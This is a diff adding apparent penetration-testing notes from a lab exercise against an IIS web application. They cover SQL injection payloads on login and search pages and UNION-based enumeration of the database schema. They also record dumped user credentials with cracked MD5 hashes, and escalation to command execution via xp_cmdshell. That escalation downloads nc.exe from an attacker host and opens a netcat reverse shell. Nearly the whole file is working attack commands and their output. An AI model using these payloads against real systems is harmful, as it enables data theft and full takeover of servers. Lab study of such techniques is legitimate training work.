@@ -1,0 +1,76 @@
+# web interface acquired
+PORT     STATE SERVICE VERSION
+4167/tcp open  http    Microsoft IIS httpd 8.5
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+# directories
+http://10.11.1.128:4167/aspnet_client
+http://10.11.1.128:4167/login.asp       
+http://10.11.1.128:4167/search.asp   
+  
+
+# sqli acquired in login.asp
+' or 1=1; --
+
+# sqli acquired in search.asp
+' or 1=1; --
+
+# found possible tables
+artists
+songs
+
+# sql quary from observation
+select song_name, year from songs where artist_name = '';
+select artist_name, year from artists where song_name = '';
+
+# comfirm 2 column will be displayed
+# REF: https://portswigger.net/web-security/sql-injection/union-attacks
+' ORDER BY 1; --
+' ORDER BY 2; --
+' ORDER BY 3; -- #error
+
+# output pattern
+' UNION SELECT 'string', 123; -- # string + number
+
+# get database version
+' UNION SELECT @@version, 123; --
+
+Microsoft SQL Server 2012 - 11.0.2100.60 (X64) Feb 10 2012 19:39:15 Copyright (c) Microsoft Corporation Express Edition (64-bit) on Windows NT 6.2 (Build 9200: ) (Hypervisor)
+
+# table name and column acquired
+' UNION SELECT table_name, 123 From INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE'; --
+' UNION SELECT column_name, 123 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users'; --
+
+albums			singles			songs																		
+	- artist		- artist		- artist																						
+	- name			- name			- name																				
+	- place 		- place 		- place 																						
+	- year			- year			- year																				
+
+users
+	- id
+	- name
+	- pass
+
+# get user credentails from user table
+' UNION SELECT name, id from users; --
+
+id:0   alice:5f4dcc3b5aa765d61d8327deb882cf99[md5]:password
+id:1   brett:34819d7beeabb9260a5c854bc85b3e44[md5]:mypassword
+id:2   peter:7d9264f1c1c042b799ef08da95a782d4[md5]:123pass123
+id:3   eric:123pass123
+
+# SQLi to RCE
+# REF: https://www.tarlogic.com/blog/red-team-tales-0x01/
+# enable xp_cmdshell
+';EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
+# send request to our server
+';EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.119.201:9000'; --
+
+# upload nc.exe to the machine
+';EXEC xp_cmdshell 'powershell.exe wget http://192.168.119.201:9000/nc.exe -OutFile c:\\Users\Public\\nc.exe'; --
+
+# call reverse shell by nc.exe
+';EXEC xp_cmdshell 'c:\\Users\Public\\nc.exe -nv 192.168.119.201 12345 -e cmd.exe'; --
+
+
